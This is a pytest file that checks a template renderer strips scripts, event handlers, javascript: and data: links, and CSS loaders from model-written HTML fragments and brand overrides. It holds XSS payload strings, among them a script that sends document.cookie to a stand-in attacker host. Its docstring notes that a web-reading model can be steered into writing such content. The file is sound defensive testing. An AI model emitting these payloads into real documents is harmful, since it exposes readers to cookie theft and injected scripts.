"""Rendered documents carry no active content from content.

Content html fragments and brand overrides are model or profile output. A model that read
the live web can be steered into writing a script, an event handler, a remote image, a
javascript: link or a CSS loader into a fragment. The renderer keeps only inline
formatting from fragments (set_html -> sanitize_fragment), refuses unsafe brand overrides
(the render fails, naming each one), and verify reports any active content left in a
document as HIGH.

Run from the module directory (or the Talent One repository root):
`python -m pytest -q tests/test_render_safety.py`. Needs beautifulsoup4.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

MODULE_ROOT = Path(__file__).resolve().parent.parent
SKILL_ROOT = MODULE_ROOT / "skills" / "talent-one"
RENDER = SKILL_ROOT / "scripts" / "render.py"
REF = SKILL_ROOT / "references"
TEMPLATE = REF / "templates" / "TK_08_Recruiter_Screen.dc.html"
SCHEMA = REF / "content-schemas" / "TK_08.content-schema.json"
EXAMPLE = REF / "content-schemas" / "TK_08.example-content.json"
DS_DIR = REF / "templates" / "_ds" / "onepromptman-ds"

HOSTILE = (
    "<script>fetch('https://attacker.invalid/x?'+document.cookie)</script>"
    '<img src="https://attacker.invalid/p.gif" onerror="alert(1)">'
    '<a href="javascript:alert(2)">click</a>'
    '<iframe src="https://attacker.invalid/"></iframe>'
    '<span style="background:url(https://attacker.invalid/b.png)" onmouseover="x()">kept text</span>'
    '<a href="https://example.com/source">a source link</a>'
)
LEFTOVERS = ("<script>fetch", "onerror", "onmouseover", "javascript:", "<iframe",
             "attacker.invalid", "<img")

# CSS loaders that do not spell url( plainly, and the panel's probes (lap 1 of S3a).
CSS_LOADERS = (
    "<span style=\"background:image-set('https://attacker.invalid/s1.png' 1x)\">css one</span>"
    "<span style=\"background:-webkit-image-set('https://attacker.invalid/s2.png' 1x)\">css two</span>"
    '<span style="background:\\75rl(https://attacker.invalid/s3.png)">css three</span>'
    '<span style="background:\\000075rl(https://attacker.invalid/s4.png)">css four</span>'
    '<span style="background:URL(https://attacker.invalid/s5.png)">css five</span>'
    '<span style="@import url(https://attacker.invalid/s6.css)">css six</span>'
    '<span style="background:cross-fade(url(https://attacker.invalid/s7.png), red 50%)">css seven</span>'
)
PROBES = (
    '<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>'
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">probe one</a>'
    '<a href=" DaTa:text/html,&lt;script&gt;x">probe two</a>'
    '<a href="java&#9;script:alert(1)">probe three</a>'
    '<math><mi xlink:href="javascript:alert(1)">probe four</mi></math>'
    "<style>@import url(https://attacker.invalid/p.css)</style>"
)
SLOT_LEFTOVERS = ("attacker.invalid", "image-set", "\\75", "\\0000", "@import", "cross-fade",
                  "<svg", "onload", "data:", "xlink:href", "<math", "<style", "script:")
HOSTILE_BRAND = {
    "--op-primary": "url(https://attacker.invalid/b1.png)",
    "--op-accent": "image-set('https://attacker.invalid/b2.png' 1x)",
    "--op-bg": "\\75rl(https://attacker.invalid/b3.png)",
    "--op-border": "red;background:url(https://attacker.invalid/b4.png)",
    "background-image": "linear-gradient(red, blue)",
}


def _render(content: Path, out: Path, *extra: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(RENDER), "render", "--template", str(TEMPLATE), "--schema", str(SCHEMA),
         "--content", str(content), "--ds", str(DS_DIR), "--out", str(out), "--strict",
         "--mode", "light", "--prefix", "TK", "--credit", "on", *extra],
        capture_output=True, text=True)


def _verify(doc: Path, report: Path) -> list[dict]:
    subprocess.run(
        [sys.executable, str(RENDER), "verify", "--template", str(TEMPLATE), "--schema", str(SCHEMA),
         "--doc", str(doc), "--out", str(report)], capture_output=True, text=True)
    return [f for f in json.loads(report.read_text())["findings"] if f["check"] == "active content"]


def _content(tmp_path: Path, fragment: str, brand: dict | None = None) -> Path:
    content = json.loads(EXAMPLE.read_text(encoding="utf-8"))
    slot = content["slots"]["sell.script"]
    slot["html"] = slot["html"].replace("<p>", "<p>" + fragment, 1)
    if brand is not None:
        content["brand"] = brand
    path = tmp_path / "hostile.json"
    path.write_text(json.dumps(content), encoding="utf-8")
    return path


def _slot_html(doc: Path) -> str:
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(doc.read_text(encoding="utf-8"), "html.parser")
    return str(soup.find(attrs={"data-slot": "sell.script"}))


def test_hostile_fragment_renders_without_active_content(tmp_path):
    out = tmp_path / "doc.html"
    proc = _render(_content(tmp_path, HOSTILE), out)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    html = out.read_text(encoding="utf-8")
    for bad in LEFTOVERS:
        assert bad not in html, bad
    assert "kept text" in html and "a source link" in html
    assert 'href="https://example.com/source"' in html
    assert _verify(out, tmp_path / "r.json") == []


def test_css_loaders_and_probes_are_dropped(tmp_path):
    out = tmp_path / "doc.html"
    proc = _render(_content(tmp_path, CSS_LOADERS + PROBES), out)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "attacker.invalid" not in out.read_text(encoding="utf-8")
    slot = _slot_html(out).lower()
    for bad in SLOT_LEFTOVERS:
        assert bad.lower() not in slot, bad
    for kept in ("css one", "css four", "css seven", "probe one", "probe three"):  # <math> goes whole
        assert kept in slot, kept
    assert _verify(out, tmp_path / "r.json") == []


def test_hostile_brand_overrides_are_refused(tmp_path):
    out = tmp_path / "doc.html"
    proc = _render(_content(tmp_path, "", brand=HOSTILE_BRAND), out)
    assert proc.returncode == 1, proc.stdout + proc.stderr
    assert not out.exists()
    for key in HOSTILE_BRAND:
        assert f"brand override '{key}' refused" in proc.stdout, key
    failed = out.with_name(out.name + ".failed").read_text(encoding="utf-8")
    assert "attacker.invalid" not in failed and "image-set" not in failed and "\\75" not in failed


def test_safe_brand_override_applies(tmp_path):
    out = tmp_path / "doc.html"
    proc = _render(_content(tmp_path, "", brand={"--op-primary": "#123456"}), out,
                   "--brand", "--op-accent=rgb(1, 2, 3)")
    assert proc.returncode == 0, proc.stdout + proc.stderr
    html = out.read_text(encoding="utf-8")
    assert "--op-primary:#123456" in html and "--op-accent:rgb(1, 2, 3)" in html
    assert _verify(out, tmp_path / "r.json") == []


def test_example_renders_clean(tmp_path):
    out = tmp_path / "doc.html"
    proc = _render(EXAMPLE, out)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert _verify(out, tmp_path / "r.json") == []


def test_verify_flags_active_content_from_another_source(tmp_path):
    out = tmp_path / "doc.html"
    assert _render(EXAMPLE, out).returncode == 0
    html = out.read_text(encoding="utf-8")
    marker = 'data-slot="sell.script"'
    assert marker in html
    i = html.index(">", html.index(marker)) + 1
    doc = tmp_path / "planted.html"
    doc.write_text(html[:i] + HOSTILE + html[i:], encoding="utf-8")
    checks = " | ".join(f["evidence"] for f in _verify(doc, tmp_path / "r.json"))
    for expected in ("<script>", "event handler", "javascript", "<iframe>", "<img"):
        assert expected in checks, (expected, checks)


def test_verify_flags_css_loaders_probes_and_brand(tmp_path):
    out = tmp_path / "doc.html"
    assert _render(EXAMPLE, out).returncode == 0
    html = out.read_text(encoding="utf-8")
    marker = 'data-slot="sell.script"'
    i = html.index(">", html.index(marker)) + 1
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html[:i] + CSS_LOADERS + PROBES + html[i:], "html.parser")
    root = soup.find(attrs={"data-mode": True})
    root["style"] = (root.get("style") or "") + ";--op-primary:image-set('https://attacker.invalid/r.png' 1x)"
    doc = tmp_path / "planted.html"
    doc.write_text(str(soup), encoding="utf-8")
    findings = _verify(doc, tmp_path / "r.json")
    checks = " | ".join(f["evidence"] for f in findings)
    assert all(f["severity"] == "HIGH" for f in findings)
    for expected in ("image-set", "-webkit-image-set", "\\\\75rl", "\\\\000075rl", "URL(", "@import",
                     "cross-fade", "<svg>", "onload", "data:text/html", " DaTa:", "java\\tscript",
                     "<math>", "--op-primary:image-set"):
        assert expected in checks, (expected, checks)
